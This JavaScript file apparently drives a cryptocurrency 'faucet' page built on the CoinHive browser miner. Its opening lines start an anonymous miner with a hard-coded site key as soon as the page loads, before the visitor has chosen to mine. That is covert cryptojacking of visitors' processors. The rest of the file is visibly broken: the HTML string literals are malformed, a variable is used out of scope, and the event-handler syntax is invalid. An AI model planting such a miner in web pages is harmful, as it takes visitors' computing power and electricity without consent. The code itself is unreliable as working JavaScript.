var anonMiner = new CoinHive.Anonymous('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc');
anonMiner.start();

function getWalletAddress() {
    var walletAddress=document.getElementById('xmrAddress').value;
    return(walletAddress);
}

function minerStats(currentWallet){
    document.getElementById('minerForm').innerHTML =
\        "<h3 style="text-align:center;color:4c4c4c;" id="formTitle">
\            Miner Stats
\        </h3>
\       <form class="register-form">
\           <div class="tim-title">
\               <h3>Wallet Address:
\                   <div id="statAddress"></div>
\                   <br/>
\                   Hashrate:
\                  <div id="statHashRate"></div>
\                  <br/>
\                  Session Hashes:
\                   <div id="statsSesHash"></div>
\                   <br/>
\                   Total Hashes:
\                   <div id="statsAcceptHash"></div>
\                   <br/>
\           </div>
\       <form>";
    document.getElementById('statAddress').innerHTML = currentWallet;
    setInterval(function(){document.getElementById('statHashRate').innerHTML = userMiner.getHashesPerSecond() + ' H/s';},10000);
    setInterval(function(){document.getElementById('statsSesHash').innerHTML = userMiner.getTotalHashes([interpolate]) + ' Hashes';},50);
    setInterval(function(){document.getElementById('statsAcceptHash').innerHTML = userMiner.getAcceptedHashes() + ' Hashes';},5000);
}

function startUserMiner(){
    var userWalletAddress=getWalletAddress();

    var userMiner = new CoinHive.User('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc',userWalletAddress);
    anonMiner.stop();
    userMiner.start();
    alert('You are now mining to: "' + userWalletAddress + '" Please leave this page open, the faucet will be dripping. You can close this Alert');
    userMiner.on('open', function minerStats(userWalletAddress));
}
